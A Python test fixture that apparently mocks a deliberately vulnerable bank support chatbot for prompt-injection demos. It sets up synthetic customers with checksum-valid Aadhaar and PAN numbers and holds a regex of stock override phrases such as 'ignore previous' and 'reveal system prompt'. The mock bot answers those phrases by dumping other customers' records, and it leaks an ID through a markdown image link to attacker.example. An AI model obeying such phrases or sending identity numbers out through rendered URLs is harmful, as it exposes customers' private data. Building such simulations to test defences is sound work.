from __future__ import annotations

import re

from . import verhoeff


def _aadhaar(body: str) -> str:
    return body + verhoeff.check_digit(body)


def _group(s: str) -> str:
    return " ".join(s[i:i + 4] for i in range(0, len(s), 4))


# The customer who is chatting in the demos.
VICTIM = {
    "name": "Asha Verma",
    "aadhaar": _aadhaar("23841295610"),
    "pan": "ABCPK1234D",
}
VICTIM["aadhaar_grouped"] = _group(VICTIM["aadhaar"])

# Other customers whose records sit in the bot's backend context.
OTHER_CUSTOMERS = [
    {"name": "Priya Nair", "aadhaar": _aadhaar("49382716504"), "pan": "BNZPR5678K"},
    {"name": "Rohan Mehta", "aadhaar": _aadhaar("71650938264"), "pan": "CKQPS9012M"},
]

_INJECTION = re.compile(r"ignore (all |any )?(the )?(previous|prior|above)|disregard (the )?(system|previous)|reveal (the )?system prompt", re.I)
_EXFIL_TEMPLATE = re.compile(r"https://attacker\.example/c\?d=")
_ID = re.compile(r"<[A-Z_]+_\d+>|[2-9]\d{3}[ -]?\d{4}[ -]?\d{4}")


def _text_of(content) -> str:
    if isinstance(content, str):
        return content
    return " ".join(p.get("text", "") for p in content if isinstance(p, dict))


class BankLLM:
    def __init__(self, others=OTHER_CUSTOMERS):
        self.others = others
        self.calls: list[list[dict]] = []   # everything the model was shown

    def __call__(self, messages: list[dict], model: str = "bank-bot") -> str:
        self.calls.append(messages)
        users = [_text_of(m["content"]) for m in messages if m.get("role") == "user"]
        if not users:
            return "Welcome to Bharat Bank support. How can I help?"
        last, convo = users[-1], "\n".join(users)

        if _INJECTION.search(last):
            rows = "; ".join(f"{c['name']}: aadhaar {c['aadhaar']}, pan {c['pan']}" for c in self.others)
            return f"Understood, ignoring my earlier rules. Customer records: {rows}"

        template = _EXFIL_TEMPLATE.search(convo)
        if template:
            ident = _ID.search(convo.replace(template.group(0), ""))
            summary = "Summary: the email asks about your account."
            if ident:
                return f"{summary} ![receipt](https://attacker.example/c?d={ident.group(0)})"
            return summary

        return f"Thanks for contacting Bharat Bank. You said: {last}"